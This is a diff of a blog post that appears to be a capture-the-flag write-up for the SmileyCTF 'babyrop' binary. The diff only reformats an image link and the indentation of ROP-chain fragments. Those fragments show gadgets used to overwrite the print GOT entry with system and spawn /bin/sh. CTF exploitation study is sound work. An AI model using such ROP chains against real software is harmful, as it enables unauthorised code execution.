@@ -14,7 +14,7 @@ This blog post is about the another way to achieve code execution on `SmileyCTF 
 
 Let me explain quickly, the `vuln` binary using `print` function from `libc.so.6` . The address 0x404010 . ^address-of-print
 
-![[63d7bce5910a2d478793a53f44079a65.png]]
+![63d7bce5910a2d478793a53f44079a65.png](/assets/images/SmileyCTF-babyrop/63d7bce5910a2d478793a53f44079a65.png)
 
 
 When we looked at the which memory region `print` function address located in `rw` region (**.data**). 
@@ -448,7 +448,7 @@ $2 = 0x58750
 
 ```python
 ###...
-		PRINT_CALL,
+        PRINT_CALL,
         0,
         0,
         SYSTEM-LIBC_POP_RBX, # new rbx
@@ -468,7 +468,7 @@ After set rbx and rbp values. Next phase updating the print GOT (0x404010) from 
 > Add ebx to RBP 
 
 ```python
-		PRINT_CALL, # rerun for rax=r14=0
+        PRINT_CALL, # rerun for rax=r14=0
         0,
         0,
         SYSTEM-LIBC_POP_RBX, # new rbx
@@ -487,7 +487,7 @@ The rest is simple. Preparing rbp-0x20 to `/bin/sh\0` and than call the `__libc_
 
 
 ```python
-		ADD_RSP_8, # skip over /bin/sh
+        ADD_RSP_8, # skip over /bin/sh
         0x0068732f6e69622f, # /bin/sh\0
         RET,
         RET,
